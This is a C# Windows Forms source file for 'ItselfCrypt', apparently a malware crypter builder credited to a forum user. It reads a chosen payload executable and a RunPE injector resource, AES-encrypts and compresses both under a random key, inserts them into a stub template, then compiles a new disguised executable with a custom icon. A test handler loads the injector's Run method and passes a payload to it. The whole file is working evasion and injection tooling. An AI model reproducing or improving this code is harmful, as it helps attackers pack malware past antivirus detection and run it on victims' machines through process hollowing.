using Microsoft.CSharp;
using System;
using System.CodeDom.Compiler;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.IO;
using System.IO.Compression;
using System.Linq;
using System.Reflection;
using System.Resources;
using System.Security.Cryptography;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace ItselfCrypt
{
    
    public partial class Form1 : Form
    {
    /// <summary>
    /// Made by BahNahNah
    /// &uid=2388291
    /// Credit to Aeonhack for Runpe code
    /// </summary>
    
        public Form1()
        {
            InitializeComponent();
        }

        private void button1_Click(object sender, EventArgs e)
        {
            Type Ty;
            using(OpenFileDialog ofd = new OpenFileDialog())
            {
                ofd.ShowDialog();
                Ty = Assembly.LoadFile(ofd.FileName).GetType("Resource.reflect");
            }
            using(OpenFileDialog ofd = new OpenFileDialog())
            {
                ofd.ShowDialog();
                Ty.GetMethod("Run").Invoke(null, new object[] { Assembly.GetExecutingAssembly().Location, "", File.ReadAllBytes(ofd.FileName), false });
            }
        }

        private void Form1_Load(object sender, EventArgs e)
        {

        }

        void BuildCode(string code, string output, string ico, params string[] resources)
        {
            CSharpCodeProvider codeProvider = new CSharpCodeProvider(new Dictionary<string, string>() { { "CompilerVersion", "v4.0" } });
            ICodeCompiler icc = codeProvider.CreateCompiler();
            System.CodeDom.Compiler.CompilerParameters parameters = new CompilerParameters(new[] { "mscorlib.dll", "System.dll", "System.Core.dll", "System.Windows.Forms.dll", "System.Xml.dll", "System.Xml.Linq.dll" });//,
            parameters.GenerateExecutable = true;
            parameters.OutputAssembly = output;
            parameters.CompilerOptions = "/platform:X86 /target:winexe";
            parameters.CompilerOptions += string.Format(" /win32icon:\"{0}\"", ico);
            foreach (string res in resources)
            {
                parameters.EmbeddedResources.Add(res);
            }
            CompilerResults results = icc.CompileAssemblyFromSource(parameters, code);
            if (results.Errors.Count > 0)
            {
                foreach (CompilerError CompErr in results.Errors)
                {
                    BuildLog.Text = BuildLog.Text +
                        "Line number " + CompErr.Line +
                        ", Error Number: " + CompErr.ErrorNumber +
                        ", '" + CompErr.ErrorText + ";" +
                        Environment.NewLine + Environment.NewLine;
                }
            }
            else
            {
                BuildLog.Text += "Successfull build.\n";
            }

        }

        private static byte[] Compress(byte[] b)
        {
            using (MemoryStream ms = new MemoryStream())
            {
                using (DeflateStream ds = new DeflateStream(ms, CompressionMode.Compress))
                {
                    ds.Write(b, 0, b.Length);
                }
                return ms.ToArray();
            }
        }

        private static byte[] _Encrypt(byte[] Payload, string _key)
        {
            try
            {
                PasswordDeriveBytes pdb =
                  new PasswordDeriveBytes(_key,
                  Encoding.UTF8.GetBytes("2388291"));
                MemoryStream ms = new MemoryStream();
                Aes aes = new AesManaged();
                aes.Key = pdb.GetBytes(aes.KeySize / 8);
                aes.IV = pdb.GetBytes(aes.BlockSize / 8);
                CryptoStream cs = new CryptoStream(ms,
                  aes.CreateEncryptor(), CryptoStreamMode.Write);
                cs.Write(Payload, 0, Payload.Length);
                cs.Close();
                return ms.ToArray();
            }
            catch
            {
                Environment.Exit(0);
                return new byte[] { };
            }
        }

        private void button1_Click_1(object sender, EventArgs e)
        {
            using(OpenFileDialog ofd = new OpenFileDialog())
            {
                if(ofd.ShowDialog() == System.Windows.Forms.DialogResult.OK)
                {
                    ofd.Filter = "Payload|*.exe";
                    FilePathTextbox.Text = ofd.FileName;
                }
            }
        }

        private void button2_Click(object sender, EventArgs e)
        {
            if(FilePathTextbox.Text == "")
            {
                MessageBox.Show("Select a file!");
                return;
            }
            string path = FilePathTextbox.Text;
            if(!File.Exists(path))
            {
                MessageBox.Show("File Invalid!");
                return;
            }

            string savepath;
            using(SaveFileDialog sfd = new SaveFileDialog())
            {
                sfd.Filter = "Output|*.exe";
                if (sfd.ShowDialog() != System.Windows.Forms.DialogResult.OK)
                    return;
                savepath = sfd.FileName;
            }

            string res = Guid.NewGuid().ToString().Replace("-", "");
            string dropDir = System.IO.Path.Combine(Environment.CurrentDirectory, "Temp"); ;
            string encRes = Path.Combine(dropDir, res + ".resources");
            if (!Directory.Exists(dropDir))
                Directory.CreateDirectory(dropDir);
            string injResName = "inj" + Guid.NewGuid().ToString().Replace("-", "");
            string payloadResName = "pay" + Guid.NewGuid().ToString().Replace("-", "");

            byte[] Payload = File.ReadAllBytes(path);
            byte[] injBytes = ItselfCrypt.Properties.Resources.RunpeResource;

            //injBytes = File.ReadAllBytes(@"H:\Visual Studio Projects\Projects 15\ItselfCrypt\Resource\bin\Debug\Resource.dll");

            string encKey = "enc" + Guid.NewGuid().ToString().Replace("-", "");

            Payload = _Encrypt(Payload, encKey);
            injBytes = _Encrypt(injBytes, encKey);

            Payload = Compress(Payload);
            injBytes = Compress(injBytes);

            //injBytes = Decompress(injBytes);


           // MethodInfo BahNahNah = Assembly.Load(injBytes).GetType("Resource.reflect").GetMethod("Run");
           // bool suc = (bool)BahNahNah.Invoke(null, new object[] { Assembly.GetExecutingAssembly().Location, "", Payload, false });
            //MessageBox.Show(suc.ToString());
            string stubCode = ItselfCrypt.Properties.Resources.StubCode;
            stubCode = stubCode.Replace("[ResName]", res);
            stubCode = stubCode.Replace("[InjRes]", injResName);
            stubCode = stubCode.Replace("[PayloadRes]", payloadResName);
            stubCode = stubCode.Replace("[EncKey]", encKey);

            using (ResourceWriter Writer = new ResourceWriter(encRes))
            {
                Writer.AddResource(injResName, injBytes);
                Writer.AddResource(payloadResName, Payload);
                Writer.Generate();
            }
            string ico = IcoTextbox.Text;
            if(ico == "" || !ico.EndsWith(".ico") || !File.Exists(ico))
            {
                ico = Path.Combine(dropDir, "def.ico");
                File.WriteAllBytes(ico, ItselfCrypt.Properties.Resources.ico);
            }
            BuildCode(stubCode, savepath, ico, encRes);
            Directory.Delete(dropDir, true);
        }

        private static byte[] Decompress(byte[] b)
        {
            using (MemoryStream uncompressed = new MemoryStream())
            {
                using (MemoryStream compressed = new MemoryStream(b))
                {
                    using (DeflateStream ds = new DeflateStream(compressed, CompressionMode.Decompress))
                    {
                        ds.CopyTo(uncompressed);
                        return uncompressed.ToArray();
                    }
                }
            }
        }

        private void button3_Click(object sender, EventArgs e)
        {
            using(OpenFileDialog ofd = new OpenFileDialog())
            {
                ofd.Filter = "Icon|*.ico";
                if(ofd.ShowDialog() == System.Windows.Forms.DialogResult.OK )
                {
                    IcoTextbox.Text = ofd.FileName;
                }
            }
        }
    }
}
